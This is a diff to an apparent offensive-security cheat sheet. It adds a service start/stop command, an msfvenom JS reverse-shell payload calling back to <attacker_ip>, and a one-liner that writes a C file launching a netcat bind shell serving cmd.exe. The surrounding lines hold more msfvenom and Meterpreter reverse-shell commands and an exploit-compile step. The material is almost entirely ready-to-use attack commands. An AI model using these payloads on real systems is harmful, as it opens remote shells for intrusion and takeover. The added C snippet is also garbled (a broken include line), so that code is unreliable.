@@ -70,6 +70,7 @@ FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.tx
     then move new old, and restart the service with:
     *$ wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]*
+    *$ sc start/stop serviceName*
 
     If you don't have access to vmic, you can do:
     *$ sc qc upnphost*
@@ -388,6 +389,8 @@ msfvenom -p generic/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f php -o s
     *msfvenom -p linux/x86/shell/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f perl -b \x00\x0A\x0D\xFF*
     Raw paylaod:
     *msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw -o test.bin*
+    Js payload:
+    *msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f js_le*
     Handling reverse shell using meterpreter:
     *msf > use exploit/multi/handler
 msf > set lport 1234
@@ -425,3 +428,6 @@ int i;
 return 0;
 }*
     *i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe*
+
+    Run an arbitrary command:
+    *echo -e '#include <stdio.h>\n#include <smain () {\nsystem("C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe");\nreturn(0);\n}'> poc.c*
